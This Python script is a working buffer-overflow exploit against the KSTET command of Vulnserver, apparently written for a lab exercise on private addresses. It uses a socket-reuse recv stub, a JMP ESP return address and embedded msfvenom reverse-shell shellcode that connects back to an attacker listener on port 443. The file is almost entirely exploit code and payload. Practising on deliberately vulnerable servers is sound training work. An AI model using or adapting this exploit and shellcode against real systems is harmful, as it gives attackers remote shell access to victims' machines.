#!/usr/bin/python
import os
import socket
import struct
import sys
import time

'''
## looks like 2 ways to solve
https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/
https://medium.com/@yiukingyau/exploit-kstet-command-egghunter-vulnserver-walkthrough-c6b1ab20c918
'''


host = "192.168.10.30"
port = 9999

buf_totlen = 90
buf_offset = 66

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.10 LPORT=443 -b "\x00" -f python
# Length = 351 bytes 
payload = ("\xdd\xc6\xbf\x86\x54\xec\xae\xd9\x74\x24\xf4\x5d\x31"
"\xc9\xb1\x52\x31\x7d\x17\x03\x7d\x17\x83\x43\x50\x0e"
"\x5b\xb7\xb1\x4c\xa4\x47\x42\x31\x2c\xa2\x73\x71\x4a"
"\xa7\x24\x41\x18\xe5\xc8\x2a\x4c\x1d\x5a\x5e\x59\x12"
"\xeb\xd5\xbf\x1d\xec\x46\x83\x3c\x6e\x95\xd0\x9e\x4f"
"\x56\x25\xdf\x88\x8b\xc4\x8d\x41\xc7\x7b\x21\xe5\x9d"
"\x47\xca\xb5\x30\xc0\x2f\x0d\x32\xe1\xfe\x05\x6d\x21"
"\x01\xc9\x05\x68\x19\x0e\x23\x22\x92\xe4\xdf\xb5\x72"
"\x35\x1f\x19\xbb\xf9\xd2\x63\xfc\x3e\x0d\x16\xf4\x3c"
"\xb0\x21\xc3\x3f\x6e\xa7\xd7\x98\xe5\x1f\x33\x18\x29"
"\xf9\xb0\x16\x86\x8d\x9e\x3a\x19\x41\x95\x47\x92\x64"
"\x79\xce\xe0\x42\x5d\x8a\xb3\xeb\xc4\x76\x15\x13\x16"
"\xd9\xca\xb1\x5d\xf4\x1f\xc8\x3c\x91\xec\xe1\xbe\x61"
"\x7b\x71\xcd\x53\x24\x29\x59\xd8\xad\xf7\x9e\x1f\x84"
"\x40\x30\xde\x27\xb1\x19\x25\x73\xe1\x31\x8c\xfc\x6a"
"\xc1\x31\x29\x3c\x91\x9d\x82\xfd\x41\x5e\x73\x96\x8b"
"\x51\xac\x86\xb4\xbb\xc5\x2d\x4f\x2c\x2a\x19\x45\xa6"
"\xc2\x58\x59\xb7\xa9\xd4\xbf\xdd\xdd\xb0\x68\x4a\x47"
"\x99\xe2\xeb\x88\x37\x8f\x2c\x02\xb4\x70\xe2\xe3\xb1"
"\x62\x93\x03\x8c\xd8\x32\x1b\x3a\x74\xd8\x8e\xa1\x84"
"\x97\xb2\x7d\xd3\xf0\x05\x74\xb1\xec\x3c\x2e\xa7\xec"
"\xd9\x09\x63\x2b\x1a\x97\x6a\xbe\x26\xb3\x7c\x06\xa6"
"\xff\x28\xd6\xf1\xa9\x86\x90\xab\x1b\x70\x4b\x07\xf2"
"\x14\x0a\x6b\xc5\x62\x13\xa6\xb3\x8a\xa2\x1f\x82\xb5"
"\x0b\xc8\x02\xce\x71\x68\xec\x05\x32\x98\xa7\x07\x13"
"\x31\x6e\xd2\x21\x5c\x91\x09\x65\x59\x12\xbb\x16\x9e"
"\x0a\xce\x13\xda\x8c\x23\x6e\x73\x79\x43\xdd\x74\xa8")

ws2_32_recv = ("\x54"		# PUSH ESP
"\x58"							# POP EAX
"\x66\x05\x88\x01"			# ADD AX, 0x188
"\x83\xec\x64"					# SUB ESP, 0x64
"\x33\xdb"						# XOR EBX, EBX
"\x53"							# PUSH EBX
"\x80\xc7\x04"					# ADD BH, 0x4
"\x53"							# PUSH EBX
"\x54"							# PUSH ESP
"\x5b"							# POP EBX
"\x83\xc3\x64"					# ADD EBX, 0x64
"\x53"							# PUSH EBX
"\xff\x30"						# PUSH DWORD PTR DS:[EAX]
"\xb8\x90\x2c\x25\x40"		# MOV EAX, 0x40252C90
"\xc1\xe8\x08"					# SHR EAX, 0x8
"\xff\xd0"						# CALL EBX
)

jmp_esp = struct.pack("<I", 0x62501203)
jmp_bak = ("\x54"				# PUSH ESP
"\x5A"							# POP EDX
"\x80\xEA\x46"					# SUB DL, 0x46
"\xFF\xE2"						# JMP EDX
)

buffer = ws2_32_recv
buffer += "\x90" * (buf_offset - len(ws2_32_recv))
buffer += jmp_esp
buffer += jmp_bak
buffer += "\x90" * (buf_totlen - len(buffer))

try: 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.recv(1024)
	s.send("KSTET /.:/" + buffer)
	print("[x] Sending " + str(len(buffer)) + " first stage!")
	time.sleep(3)
	s.send(payload)
	print("[x] Sending reverse shell!")
	s.close()
except:
	print("Something went wrong!")

